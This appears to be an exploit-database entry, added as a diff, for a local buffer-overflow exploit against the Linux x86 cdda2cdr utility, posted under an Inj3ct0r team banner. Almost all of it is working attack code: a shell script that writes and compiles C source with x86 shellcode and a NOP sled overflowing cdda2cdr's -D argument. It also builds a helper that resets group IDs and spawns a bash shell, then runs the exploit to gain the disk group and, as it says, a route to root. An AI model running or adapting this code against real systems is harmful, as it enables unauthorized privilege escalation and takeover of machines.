@@ -1,0 +1,119 @@
+id: 17179
+date: 11/17/2011
+title: linux/x86 cdda2cdr local disk exploit
+author: Angel Injection
+cves: 
+
+#! /bin/sh
+#
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : 1337day.com                                   0
+1  [+] Support e-mail  : submit[at]1337day.com                         1
+0                                                                      0
+1               #########################################              1
+0               I'm Angel Injection member from Inj3ct0r Team          1
+1               #########################################              0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+cat > /tmp/cdda2x.c <<EOF
+
+/**
+ ** Linux x86 cdda2cdr local disk exploit
+ ** gcc -o inj3ct0r inj3ct0r.c inj3ct0r <offset> <bufsiz>
+ **/
+
+
+#include <stdlib.h>
+#include <stdio.h>
+
+char exec[]= /* Generic Linux x86 running our /tmp program */
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/tmp/cd";
+
+
+
+#define LEN 500
+#define NOP 0x90
+
+unsigned long get_sp(void) {
+
+__asm__("movl %esp, %eax");
+
+}
+
+
+void main(int argc, char *argv[]) {
+
+int offset=0;
+int i;
+int buflen = LEN;
+long int addr;
+char buf[LEN];
+
+ if(argc > 3) {
+  fprintf(stderr, "Error: Usage: %s offset buffer\n", argv[0]);
+ exit(0);
+ }
+ else if (argc == 2){
+   offset=atoi(argv[1]);
+
+ }
+ else if (argc == 3) {
+   offset=atoi(argv[1]);
+   buflen=atoi(argv[2]);
+
+ }
+ else {
+   offset=500;
+   buflen=500;
+
+ }
+
+
+addr=get_sp();
+
+fprintf(stderr, "Linux x86 cdda2cdr local disk exploit\n");
+fprintf(stderr, "Using addr: 0x%x\n", addr+offset);
+
+memset(buf,NOP,buflen);
+memcpy(buf+(buflen/2),exec,strlen(exec));
+for(i=((buflen/2) + strlen(exec))+1;i<buflen-4;i+=4)
+ *(int *)&buf[i]=addr+offset;
+
+execl("/usr/bin/cdda2cdr", "cdda2cdr", "-D", buf, NULL);
+
+
+/*
+for (i=0; i < strlen(buf); i++) putchar(buf[i]);
+*/
+
+}
+
+EOF
+
+cat > /tmp/cd.c <<EOF
+void main() {
+    setregid(getegid(), getegid());
+    system("/bin/bash");
+}
+EOF
+
+gcc -o /tmp/cd /tmp/cd.c
+gcc -o /tmp/cdda2x /tmp/cdda2x.c
+echo "Note that gid=6 leads to easy root access.."
+/tmp/cdda2x
+
+
+
+#  0day.today [2023-03-23]  #
